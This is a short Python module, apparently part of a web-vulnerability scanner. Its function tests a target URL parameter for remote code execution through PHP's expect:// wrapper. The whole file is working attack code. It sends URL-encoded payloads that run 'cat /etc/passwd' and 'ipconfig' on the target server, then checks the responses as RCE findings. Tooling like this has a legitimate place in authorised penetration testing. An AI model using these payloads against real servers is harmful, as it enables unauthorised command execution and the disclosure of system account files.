"""Expect"""
from src.utils.arguments import ArgumentHandler
from src.configs.config import proxies
from src.httpreqs.request import prepareRequest
from src.httpreqs.request import REQUEST
from src.utils import colors


def test_expect(url, post):
    """Test Expect"""
    args = ArgumentHandler()
    if args.args['verbose']:
        print(colors.blue("[i]") + " Testing with expect wrapper...")

    tests = []
    tests.append("expect%3A%2F%2Fcat%20%2Fetc%2Fpasswd")
    tests.append("expect%3A%2F%2Fipconfig")

    for i, test in enumerate(tests):
        u, reqHeaders, postTest = prepareRequest(args.args['param'], test, url, post)
        _, br = REQUEST(u, reqHeaders, postTest, proxies, "RCE", "EXPECT")

        if not br:
            return

        if i == 1 and args.args['quick']:
            return

    return
